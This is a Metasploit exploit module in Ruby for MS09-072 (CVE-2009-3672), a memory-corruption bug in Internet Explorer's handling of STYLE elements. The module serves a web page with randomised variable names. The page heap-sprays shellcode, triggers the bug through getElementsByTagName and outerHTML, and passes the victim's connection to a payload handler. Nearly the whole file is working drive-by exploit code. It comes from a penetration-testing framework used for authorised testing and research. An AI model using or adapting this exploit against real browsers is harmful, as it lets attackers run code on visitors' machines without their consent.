##
# $Id: ms09_072_style_object.rb 9787 2010-07-12 02:51:50Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	#
	# Superceded by ms10_018_ie_behaviors, disable for BrowserAutopwn
	#
	#include Msf::Exploit::Remote::BrowserAutopwn
	#autopwn_info({
	#	:ua_name    => HttpClients::IE,
	#	:ua_minver  => "6.0",
	#	:ua_maxver  => "7.0",
	#	:javascript => true,
	#	:os_name    => OperatingSystems::WINDOWS,
	#	:vuln_test  => nil, # no way to test without just trying it
	#	:rank       => LowRanking  # exploitable on ie7/vista
	#})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer Style getElementsByTagName Memory Corruption',
			'Description'    => %q{
				This module exploits a vulnerability in the getElementsByTagName function
			as implemented within Internet Explorer.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'securitylab.ir <K4mr4n_st[at]yahoo.com>',
					'jduck'
				],
			'Version'        => '$Revision: 9787 $',
			'References'     =>
				[
					['MSB', 'MS09-072'],
					['CVE', '2009-3672'],
					['OSVDB', '50622'],
					['BID', '37085'],
					['URL', 'http://www.microsoft.com/technet/security/advisory/977981.mspx'],
					['URL', 'http://taossa.com/archive/bh08sotirovdowd.pdf'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC'          => 'process',
					'HTTP::compression' => 'gzip',
					'HTTP::chunked'     => true
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'Compat'   =>
						{
							'ConnectionType' => '-find',
						},
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { }],
				],
			'DisclosureDate' => 'Nov 20 2009',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)

		# resulting eips:
		# 0x501d6bd8 # windows vista ie7 (mshtml.dll 7.0.6001.18203)
		# 0xc5fe7dc9 # windows xp sp3 ie6 (mshtml.dll 6.0.2900.5848)
		# nul deref! # windows xp sp3 ie7 (mshtml.dll 7.0.5730.13)
		# 0x6e767fae # windows 2k3 sp2 ie6 (mshtml.dll 6.0.3790.4470)
		# 0x6cf941a7 # windows 2k3 sp2 ie7 (mshtml.dll 7.0.6000.16825)

		print_status("Entering heap spray mode for #{cli.peerhost}:#{cli.peerport}")

		var_memory    = rand_text_alpha(rand(100) + 1)
		var_boom      = rand_text_alpha(rand(100) + 1)
		var_body      = rand_text_alpha(rand(100) + 1)
		var_unescape  = rand_text_alpha(rand(100) + 1)
		var_shellcode = rand_text_alpha(rand(100) + 1)
		var_spray     = rand_text_alpha(rand(100) + 1)
		var_start     = rand_text_alpha(rand(100) + 1)
		var_i         = rand_text_alpha(rand(100) + 1)
		var_ss        = rand_text_alpha(rand(100) + 1)
		var_fb        = rand_text_alpha(rand(100) + 1)
		var_bk        = rand_text_alpha(rand(100) + 1)

		html = %Q|<!DOCTYPE>
<head>
<script language=javascript>
function #{var_boom}(){ document.getElementsByTagName('STYLE')[0].outerHTML++; }
function #{var_body}(){
var #{var_unescape} = unescape;
var #{var_shellcode} = #{var_unescape}( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');
var #{var_spray} = #{var_unescape}( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );
var #{var_ss} = 20 + #{var_shellcode}.length;
while (#{var_spray}.length < #{var_ss}) #{var_spray}+=#{var_spray};
#{var_fb} = #{var_spray}.substring(0,#{var_ss});
#{var_bk} = #{var_spray}.substring(0,#{var_spray}.length-#{var_ss});
while(#{var_bk}.length+#{var_ss} < 0x100000) #{var_bk} = #{var_bk}+#{var_bk}+#{var_fb};
var #{var_memory} = new Array();
for (#{var_i}=0;#{var_i}<1285;#{var_i}++) #{var_memory}[#{var_i}]=#{var_bk}+#{var_shellcode};
#{var_boom}();
}
</script>
<STYLE>* { margin: 0; overflow: scroll }</STYLE>
<BODY ONLOAD="#{var_body}()">
</body>
</html>
|

		# Transmit the response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache' })

		# Handle the payload
		handler(cli)
	end
end